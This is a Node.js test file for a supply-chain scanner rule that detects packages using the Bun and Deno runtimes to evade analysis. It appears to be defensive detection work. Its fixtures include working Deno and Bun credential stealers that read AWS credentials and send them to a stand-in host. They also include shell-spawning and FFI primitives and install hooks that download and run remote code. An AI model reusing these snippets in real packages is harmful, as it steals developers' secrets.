import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-runtime-evasion.js';
import { runAll } from '../backend/detectors/index.js';

const PKG = (extra = {}) => ({ name: 'ui-theme-toolkit', version: '2.4.1', ...extra });
const f = (path, content) => ({ path, content });
const types = (finding) => (finding?.detail || []).map((d) => d.type);

/* ------------------------------------------------------------------ *
 * G1.1 — the headline: Deno idiom scored zero findings                *
 * ------------------------------------------------------------------ */

// Behaviourally identical credential stealers. Before D29 the Node version
// scored HIGH, the Bun version scored HIGH, and the Deno version produced
// zero findings across the entire pipeline.
const DENO_STEALER = `
async function go() {
  const key = await Deno.readTextFile(Deno.env.get('HOME') + '/.aws/credentials');
  await new Deno.Command('id').output();
  const c = await Deno.connect({ hostname: 'collector.example.net', port: 443 });
  await c.write(new TextEncoder().encode(key));
}
export default go;
`;

const BUN_STEALER = `
async function go() {
  const key = await Bun.file(process.env.HOME + '/.aws/credentials').text();
  await Bun.$\`id\`;
  const s = await Bun.connect({ hostname: 'collector.example.net', port: 443 });
  s.write(key);
}
export default go;
`;

test('D29: Deno-idiom credential stealer is detected (G1.1)', () => {
  const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', DENO_STEALER)]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, 'D29-RUNTIME-EVASION');
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].message.includes('deno'));
});

test('D29: Deno stealer reports exec, credential and network capability', () => {
  const [finding] = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', DENO_STEALER)]);
  const detected = types(finding);
  assert.ok(detected.includes('alt_runtime_exec_entry'), 'missing exec');
  assert.ok(detected.includes('alt_runtime_credential_access'), 'missing credential access');
  assert.ok(detected.includes('alt_runtime_network_entry'), 'missing network');
});

test('D29: Bun-idiom stealer using Bun.$ and Bun.connect is detected', () => {
  const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', BUN_STEALER)]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(types(findings[0]).includes('alt_runtime_exec_entry'));
});

test('D29: Deno stealer is surfaced through the full detector pipeline', async () => {
  const files = [f('index.js', DENO_STEALER)];
  const findings = await runAll(PKG({ main: 'index.js' }), files, null, files);
  assert.ok(findings.some((x) => x.id === 'D29-RUNTIME-EVASION'));
});

/* ------------------------------------------------------------------ *
 * G1.2 — the eleven Bun primitives that evaded D24                    *
 * ------------------------------------------------------------------ */

const BUN_PRIMITIVES = {
  'Bun.$ tagged template (Bun Shell)': 'await Bun.$`id`;',
  'imported $ from bun': 'import { $ } from "bun"; await $`id`;',
  'Bun.spawnSync': 'Bun.spawnSync(["id"]);',
  'bun:ffi dlopen': 'import { dlopen } from "bun:ffi"; dlopen("libc.so", {});',
  'require bun:ffi': 'const { dlopen } = require("bun:ffi"); dlopen("libc.so", {});',
};

for (const [label, code] of Object.entries(BUN_PRIMITIVES)) {
  test(`D29: ${label} is detected (evaded D24)`, () => {
    const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', code)]);
    assert.ok(findings.length > 0, `${label} produced no finding`);
    assert.ok(['high', 'critical'].includes(findings[0].severity));
  });
}

const DENO_PRIMITIVES = {
  'new Deno.Command': 'const c = new Deno.Command("sh", { args: ["-c", "x"] }); await c.output();',
  'Deno.dlopen': 'Deno.dlopen("libc.so", {});',
  'Deno.run (legacy)': 'Deno.run({ cmd: ["id"] });',
};

for (const [label, code] of Object.entries(DENO_PRIMITIVES)) {
  test(`D29: ${label} is detected`, () => {
    const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', code)]);
    assert.ok(findings.length > 0, `${label} produced no finding`);
  });
}

test('D29: FFI dynamic linking is treated as critical', () => {
  const findings = scan(PKG({ main: 'index.js' }), [], null, [
    f('index.js', 'import { dlopen } from "bun:ffi"; dlopen("libc.so", {});'),
  ]);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].recommendation.includes('FFI'));
  assert.ok(types(findings[0]).includes('alt_runtime_ffi'));
});

/* ------------------------------------------------------------------ *
 * Runtime binary downloads in lifecycle hooks                         *
 * ------------------------------------------------------------------ */

test('D29: preinstall downloading the Bun runtime is critical', () => {
  const findings = scan(
    PKG({ scripts: { preinstall: 'curl -fsSL https://bun.sh/install | bash' } }),
    [],
    null,
    []
  );
  assert.equal(findings[0].severity, 'critical');
  assert.ok(types(findings[0]).includes('runtime_download_install_time'));
});

test('D29: hook indirection through setup.mjs is followed (preinstall: node setup.mjs)', () => {
  const files = [
    f(
      'setup.mjs',
      'await fetch("https://github.com/denoland/deno/releases/download/v2/deno.zip");'
    ),
  ];
  const findings = scan(PKG({ scripts: { preinstall: 'node setup.mjs' } }), [], null, files);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(types(findings[0]).includes('runtime_download_install_time'));
});

test('D29: QuickJS binary download is detected', () => {
  const findings = scan(
    PKG({ scripts: { install: 'wget https://bellard.org/quickjs/qjs && ./qjs payload.js' } }),
    [],
    null,
    []
  );
  assert.ok(findings.length > 0);
  assert.ok(types(findings[0]).includes('runtime_download_install_time'));
});

test('D29: hook invoking an alternative runtime directly is flagged', () => {
  const findings = scan(PKG({ scripts: { postinstall: 'bun run ./payload.js' } }), [], null, []);
  assert.ok(findings.length > 0);
  assert.ok(types(findings[0]).includes('alt_runtime_hook_interpreter'));
});

/* ------------------------------------------------------------------ *
 * G1.3 / G1.4 — parser-level evasion                                  *
 * ------------------------------------------------------------------ */

test('D29: an #!/usr/bin/env bun hashbang no longer hides the payload (G1.4)', () => {
  const withHashbang = '#!/usr/bin/env bun\n' + BUN_STEALER;
  const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', withHashbang)]);
  assert.ok(findings.length > 0, 'hashbang file produced no finding');
  assert.equal(findings[0].severity, 'critical');
});

test('D29: import attributes (ES2025) no longer make a file unparsable (G1.4)', () => {
  const code = 'import cfg from "./c.json" with { type: "json" };\n' + BUN_STEALER;
  const findings = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', code)]);
  assert.ok(findings.length > 0);
});

test('D29: TypeScript entry points are still scanned for runtime downloads (G1.3)', () => {
  // Bun and Deno execute .ts natively, so a .ts entry is a working package.
  const files = [f('setup.ts', 'await fetch("https://bun.sh/install");')];
  const findings = scan(PKG({ scripts: { preinstall: 'bun run setup.ts' } }), [], null, files);
  assert.ok(findings.length > 0);
});

/* ------------------------------------------------------------------ *
 * False-positive guards                                               *
 * ------------------------------------------------------------------ */

test('D29: an honest Bun HTTP server does not fire', () => {
  const files = [
    f(
      'server.js',
      'Bun.serve({ port: 3000, fetch(req) { return new Response(Bun.file("./index.html")); } });'
    ),
  ];
  assert.deepEqual(scan(PKG({ main: 'server.js' }), [], null, files), []);
});

test('D29: cross-runtime feature detection alone does not fire', () => {
  const files = [f('index.js', 'export const isBun = typeof Bun !== "undefined" && Bun.version;')];
  assert.deepEqual(scan(PKG({ main: 'index.js' }), [], null, files), []);
});

test('D29: reading a file with Bun.file alone does not fire', () => {
  const files = [f('index.js', 'export const read = (p) => Bun.file(p).text();')];
  assert.deepEqual(scan(PKG({ main: 'index.js' }), [], null, files), []);
});

test('D29: reputable packages are exempt', () => {
  const files = [f('index.js', DENO_STEALER)];
  assert.deepEqual(scan({ name: 'react', version: '18.0.0' }, [], null, files), []);
});

test('D29: a package with no alternative-runtime usage produces nothing', () => {
  const files = [f('index.js', 'module.exports = function add(a, b) { return a + b; };')];
  assert.deepEqual(scan(PKG(), [], null, files), []);
});

/* ------------------------------------------------------------------ *
 * Finding shape                                                       *
 * ------------------------------------------------------------------ */

test('D29: finding matches the standard tier-1 shape', () => {
  const [finding] = scan(PKG({ main: 'index.js' }), [], null, [f('index.js', DENO_STEALER)]);
  assert.equal(finding.detector, 'tier1-runtime-evasion');
  assert.equal(finding.id, 'D29-RUNTIME-EVASION');
  assert.ok(['low', 'medium', 'high', 'critical'].includes(finding.severity));
  assert.ok(['LOW', 'MEDIUM', 'HIGH'].includes(finding.confidence));
  assert.equal(typeof finding.confidenceScore, 'number');
  assert.ok(finding.confidenceScore >= 0 && finding.confidenceScore <= 100);
  assert.ok(Array.isArray(finding.evidence));
  assert.ok(Array.isArray(finding.locations));
  assert.ok(finding.locations.every((l) => typeof l.file === 'string' && l.line > 0));
  assert.ok(typeof finding.recommendation === 'string');
  assert.ok(Array.isArray(finding.detail));
});
